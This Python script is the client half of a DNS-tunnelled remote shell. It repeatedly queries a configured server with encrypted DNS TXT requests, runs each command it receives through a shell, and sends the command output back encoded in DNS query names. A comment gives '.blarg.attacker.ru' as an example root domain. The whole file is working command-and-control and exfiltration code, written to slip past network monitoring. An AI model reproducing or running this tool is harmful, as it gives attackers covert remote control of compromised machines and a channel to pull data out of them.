#!/usr/bin/env python3
import dnslib
import session
import socket
import subprocess
import sys
import time
import util

#Sends data in the form of TXT queries using given dns session and sock to given addr.
#  Root is the root of the domain name to query for (".blarg.attacker.ru")
def send_data(sess,sock,addr,data,root):

	#Pack data for transit (max domain name is 64, including a size byte, so really 63)
	#  This includes dots so "payload.name.com." is 17 total
	blocks=sess.pack(data,session.cs_en_block_size())

	#Build dns request for each block and send to server
	for block in blocks:
		ident=b'\xff\xff'
		flags_and_shit=b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
		name=util.pack_dns_name(block+root)
		other_shit=b'\x00\x10\x00\x01'
		request=ident+flags_and_shit+name+other_shit
		sock.sendto(request,addr)

		#Hack to "order" packets...really need to use the nonces...
		time.sleep(0.02)

def recv_data(sess,packet):

	#Total data buffer for this read
	rx_data=b''

	#Parse responses
	responses=dnslib.DNSRecord.parse(packet)

	#Parse answers
	for response in responses.rr:

		#Get txt data
		response=response.rdata.data[0].decode('ascii')

		#Decrypt rx data
		nonce,data=sess.unpack(response)
		rx_data+=data

	return rx_data

if __name__=='__main__':

	#Get arguments from user
	passwd=util.passwd()
	root=util.get_dns_root()
	server_address=util.get_dns_address()
	server_port=util.get_dns_port()

	#Create dns session handler with given password
	sess=session.session_t(0,passwd)

	#Connect to dns server
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	serv_addr=(server_address,server_port)
	sock.connect(serv_addr)

	#Timer and timeout for querying server for updates
	query_timeout_ms=500
	query_timer=None

	try:
		#Run loop
		while True:

			#First run or query timer has run out - query server for commands
			if query_timer==None or util.millis()>query_timer:
				send_data(sess,sock,serv_addr,b'\x00',root)
				query_timer=util.millis()+query_timeout_ms

			#Get bytes from server
			while util.available(sock):
				packet,addr=sock.recvfrom(4096)
				rx_data=recv_data(sess,packet).decode('utf-8')

				#Split received commands into lines
				for line in rx_data.split('\n'):

					#Open up a process and execute command (lame shell, can't cd or anything persistently)
					proc=subprocess.Popen(line,shell=True,
						stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

					#Send data output to server
					send_data(sess,sock,serv_addr,proc.stdout.read()+proc.stderr.read(),root)

					#Update query timer
					query_timer=util.millis()+query_timeout_ms

			#Give cpu a break
			time.sleep(0.0001)

	#Ctrl+C
	except KeyboardInterrupt:
		exit(1)

	#Client side exceptions just die...
	except Exception as error:
		print(error)
		exit(2)